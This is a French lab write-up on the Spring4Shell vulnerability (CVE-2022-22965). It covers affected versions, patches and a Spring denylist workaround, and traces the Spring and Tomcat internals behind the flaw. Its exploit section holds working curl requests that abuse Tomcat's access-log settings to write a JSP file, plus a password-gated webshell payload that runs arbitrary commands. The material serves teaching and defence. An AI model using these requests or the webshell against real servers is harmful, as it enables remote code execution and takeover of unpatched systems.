<h1>Introduction à Spring(4)Shell</h1>

- [Spring(4)Shell](#spring4shell-intro)
  - [build](#build)
  - [deploy](#deploy)
  - [run](#run)
  - [exploit](#exploit)
  - [patch](#patch)
  - [Work around](#work-around)
- [Explication](#explication)
  - [setup](#setup)
  - [Spring](#spring)
  - [Tomcat et jdk9+](#tomcat-et-jdk9)
  - [exploit](#exploit)

# spring4shell intro

Spring4Shell (ou SpringShell) est une faille de sécurité importante, révélée le 29 mars, patchée le 31.

Il s'agit de la CVE-2022-22965, qui permet d'exécuter du code arbitraire sur le serveur (Remote Code Execution).
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965)

Les applications sont vulnérables si elles utilisent :
* les dépendences spring-webmvc ou spring-webflux
* du framework spring dans toutes les versions strictement inférieures aux 5.2.20 et 5.3.18 (Spring Boot 2.5.12 et 2.6.6)
* packagées en .war
* déployées sur Tomcat dans toutes les versions strictement inférieures aux 8.5.78, 9.0.62, 10.0.20
* qui s'exécutent avec Java en version 9 ou supérieure

Les solutions de contournement ou de patch sont décrites ici :
* [https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)

L'application "getting started, Handling Form Submission" est vulnérable : [https://spring.io/guides/gs/handling-form-submission/](https://spring.io/guides/gs/handling-form-submission/)

## build

set JAVA_HOME=C:\Users\a.vergnaud\dev\jdk-11

C:\Users\a.vergnaud\dev\apache-maven-3.6.3\bin\mvn clean package

## deploy

C:\Users\a.vergnaud\dev\apache-tomcat-9.0.60

## run

http://localhost:8080/spring4shell-intro/greeting

http://192.168.0.31:8080/spring4shell-intro/greeting

## exploit

curl

C:\Users\a.vergnaud\AppData\Local\Programs\Python\Python39\python.exe exp.py --url http://localhost:8080/spring4shell-intro/greeting

C:\Users\a.vergnaud\AppData\Local\Programs\Python\Python39\python.exe exploit.py --url http://localhost:8080/spring4shell-intro/greeting

C:\Users\a.vergnaud\AppData\Local\Programs\Python\Python39\python.exe exp.py --url http://192.168.0.31:8080/spring4shell-intro/greeting

C:\Users\a.vergnaud\AppData\Local\Programs\Python\Python39\python.exe exploit.py --url http://192.168.0.31:8080/spring4shell-intro/greeting

## patch

* Upgrader en spring-core 5.2.20 (Spring Boot 2.5.12)

ou

* Upgrader en spring-core 5.3.18 (Spring Boot 2.6.6)

ou

* Upgrader Tomccat en 8.5.78, 9.0.62 ou 10.0.20

## work-around

[https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement#suggested-workarounds](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement#suggested-workarounds)

* Utiliser Spring AOP
* Récupérer l'instance de WebDataBinder
* Lui interdire de _bind_ les champs nommé "class"

# Explication

## setup

![stack](./doc/spring4shell_setup.drawio.png?raw=true)

## Spring

GreetingController.java :
```java
@PostMapping("/greeting")
public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) {
    model.addAttribute("greeting", greeting);
    return "result";
}
```

Le framework Spring a la responsabilité d'instancier `greeting` à partir du body de la requête HTTP :

![wireshark capture](./doc/POST_greeting_capture_0.PNG?raw=true)

![remote debug](./doc/POST_greeting_remote_debug.png?raw=true)

Voilà une pile d'appels exécutée par l'application, au moment où elle valorise `greeting` à partir du HTTP POST data :

![spring4shell_CL_AccessLogValve_1](./doc/spring4shell_CL_AccessLogValve_1.drawio.png?raw=true)

(1) A l'exécution, on remarque que l'objet BeanWrapperImpl encapsule l'instance `greeting`, et référence 3 `propertyDescriptors` :
* "id"
* "content"
* et "class" !

On voit que Spring conserve une référence à l'objet Class de l'instance `greeting` :

![spring4shell_BeanWrapperImpl_2](./doc/spring4shell_BeanWrapperImpl_2.PNG?raw=true)

(2) Spring peut aussi d'accéder à des attributs imbriqués. Cette fonctionnalité est founrnie par la classe `AbstractNestablePropertyAccessor`
* [source](https://github.com/spring-projects/spring-framework/blob/8baf404893037951ac29393a41d40af4fa11775b/spring-beans/src/main/java/org/springframework/beans/AbstractNestablePropertyAccessor.java#L622)
* [javadoc](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/AbstractNestablePropertyAccessor.html)

```
curl -X POST \
 -F 'id=1234' \
 -F 'content=some_content' \
 -F 'someNestedPOJO.test=some_test_value' \
 http://2020P062.local:8080/spring4shell-intro/greeting
```

Côté serveur, Spring alimente bien la référence à SomeNestedPOJO :

![nested pojo 1](./doc/nested_prop_1.PNG?raw=true)

![nested pojo 2](./doc/nested_prop_2.PNG?raw=true)

Dans la pile d'appels, la valorisation des properties et _nested properties_ est faite par `AbstractNestablePropertyAccessor.setPropertyValue`

(3) Encore plus haut dans la pile d'appels, la méthode `WebDataBinder.doBind` appelle `WebDataBinder.checkAllowedFields`

![class diagram WebDataBinder](./doc/WebDataBinder.drawio.png?raw=true)

Cela permet de comprendre [une solution de contournement proposée par Spring](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement#suggested-workarounds) :

En effet, on va voir que la faille de sécurité provient de cet accès à la référence de Class.
Donc En AOP, on récupère le WebDataBinder, pour interdire à Spring de valoriser cette property.

```java
@ControllerAdvice
@Order(Ordered.LOWEST_PRECEDENCE)
public class BinderControllerAdvice {

    @InitBinder
    public void setAllowedFields(WebDataBinder dataBinder) {
         String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
         dataBinder.setDisallowedFields(denylist);
    }

}
```

> ### Point de situation
> On sait que :
> * Spring valorise les attributs passés en HTTP POST (un utilisateur les envoie à travers le formulaire)
> * Spring valorise les attributs du POJO `@ModelAttribute Greeting greeting` ET un attribut `class` de type Class
> * Spring peut valoriser des _nested properties_ pour tous ces attributs
> 
> &#8594; Est-ce qu'on pourrait valoriser certains attributs intéressants imbriqués sous `class` ?

## Tomcat (et jdk9+)

Depuis GreetingController.java :
```java
@PostMapping("/greeting")
public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) {
model.addAttribute("greeting", greeting);
return "result";
}
```
On peut accéder à ces objets :
* greeting.getClass()
* greeting.getClass().module
* greeting.getClass().module.getClassLoader()
* greeting.getClass().module.getClassLoader().[resources](https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/loader/WebappClassLoaderBase.html)
* greeting.getClass().module.getClassLoader().resource.[context](https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/core/StandardContext.html)
  `StandardEngine[Catalina].StandardHost[localhost].StandardContext[/spring4shell-intro]` 
* greeting.getClass().module.getClassLoader().resource.context.[parent](https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/core/StandardHost.html)
  `StandardEngine[Catalina].StandardHost[localhost]`
* greeting.getClass().module.getClassLoader().resources.context.parent.[pipeline](https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/core/StandardPipeline.html)
* greeting.getClass().module.getClassLoader().resources.context.parent.pipeline.[first](https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/valves/AccessLogValve.html)

La vulnérabilité est spécifique au conteneur de Servlet Apache Tomcat, parce-que :
* le ClassLoader est un org.apache.catalina.loader.WebappClassLoaderBase
* ce WebappClassLoaderBase a une méthode [getResources()](https://tomcat.apache.org/tomcat-8.0-doc/api/org/apache/catalina/loader/WebappClassLoaderBase.html#getResources%28%29) qui à son tour expose une grappe d'objet, incluant une instance de `AccessLogValve`.

![reference chain](./doc/references_chain.drawio.png?raw=true)

[AccessLogValve](https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/valves/AccessLogValve.html) écrit des logs. On peut setter certaines propriétés, pour lui demander d'écrire ce qu'on veut, où on veut.
* pattern : "The pattern used to format our access log lines"
* suffix : "Set the log file suffix."
* directory : "Set the directory in which we create log files."
* prefix : "The prefix that is added to log file filenames."
* fileDateFormat : "Date format to place in log file name."

> ### Point de situation
> On sait que :
> * Spring valorise les attributs passés en HTTP POST (un utilisateur les envoie à travers le formulaire)
> * Spring valorise les attributs du POJO `@ModelAttribute Greeting greeting` ET un attribut `class` de type Class
> * Spring peut valoriser des _nested properties_ pour tous ces attributs
>
> &#8594; Est-ce qu'on pourrait valoriser certains attributs intéressants imbriqués sous `class` ?

> ### Point de situation
> Une requête comme celle ci-dessous devrait permettre d'écrire n'importe quel fichier sur le filesystem !
> ```
> curl -X POST \
>   -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=CONTENU_DU_FICHIER' \
>   -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt' \
>   -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/spring4shell-intro' \
>   -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=NOM_DU_FICHIER' \
>   -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
>  http://2020P062.local:8080/spring4shell-intro/greeting
> ```
> C'est le cas. On observe d'ailleurs qu'un "access log" est bien créé à chaque requête...

## Exploit

1. D'abord on va écrire une .jsp.
2. Ensuite on va écrire un webshell

Première tentative :
```
curl -X POST \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=<%System.out.println(123);%>' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/spring4shell-intro' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
http://2020P062.local:8080/spring4shell-intro/greeting
```
retourne une erreur :
```
Warning: skip unknown form field: %>
curl: (26) Failed to open/read local data from file/application
```

On veut écrire `<%` et `;%>` dans le fichier de "log", mais curl interprète ces caractères...
* tentative avec urlencode : KO
* tentative avec `--form-string` : KO

Solution : la [documentation](https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html) du logger Tomcat AccessLogValve nous dit :
```
%{xxx}i write value of incoming header with name xxx (escaped if required)
```

Ecriture de .jsp réussie :
```
curl -X POST \
-H "pre:<%" \
-H "post:;%>" \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i out.println("HACKED")%{post}i' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/spring4shell-intro' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
http://2020P062.local:8080/spring4shell-intro/greeting
```
Résultat :
[http://2020p062.local:8080/spring4shell-intro/rce.jsp](http://2020p062.local:8080/spring4shell-intro/rce.jsp)

Exploit avec un webshell. On veut écrire un code de ce type dans la .jsp :
```java
@Override
protected void doGet(HttpServletRequest request, HttpServletResponse resp) throws ServletException, IOException {
    /* début du payload : */
    if ("j".equals(request.getParameter("pwd"))) {
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        while ((a = in.read(b)) != -1) {
            out.println(new String(b));
        }
    }
    /* fin du payload */
}
```

Ce payload est trop compliqué à envoyer en curl/bash. On utilise `exploit.py`.

